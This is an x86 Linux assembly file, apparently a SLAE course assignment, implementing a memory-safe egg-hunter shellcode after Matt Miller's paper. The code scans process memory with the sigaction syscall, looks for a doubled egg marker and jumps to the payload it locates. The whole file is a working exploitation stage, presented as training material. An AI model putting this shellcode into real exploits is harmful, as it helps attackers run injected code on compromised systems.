; SLAE Assigment 3 - Memsafe Egg-hunter
; Author: rtmcx (rtmcx@protonmail.com)
;
; Based on the paper “Safely Searching Process Virtual Address Space” by Matt Miller
; http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
;
; EGG = 90509050


global _start

EGG equ 0x50905090	; EGG in little endian

section .text
_start:

page_align:
	; Set up page size (which is 4096) 
	or cx, 0xfff	; Page alignment. Set cx to contain 4095

hunting:
	inc ecx		; Go to next address 

	; Setup syscall "sigaction"
	push byte 0x43	; sigaction (syscall number 67, 0x43)
	pop eax		; syscall number to eax
	int 0x80	; Execute syscall

	; compare the result
	cmp al, 0xf2	; Is the result EFAULT?  
	jz page_align	; Yes, invalid address, try next address page

	; We have access to the page and can start to search the egg..	
	
	; Set EGG in eax and current address content in edi
	mov eax, EGG
	mov edi, ecx	; Address content to compare
	
	scasd		; compare the dwords in eax/edi (scasd also increments edi by 4)
	jnz hunting	; They did not match, try next address
	
	; The EGG should be twice in a row
	; so compare next 4 bytes
	scasd 		; compare the next 4 bytes
	jnz hunting	; They did not match, try next address

	; EGG Found
	jmp edi		; jump to address of the EGG
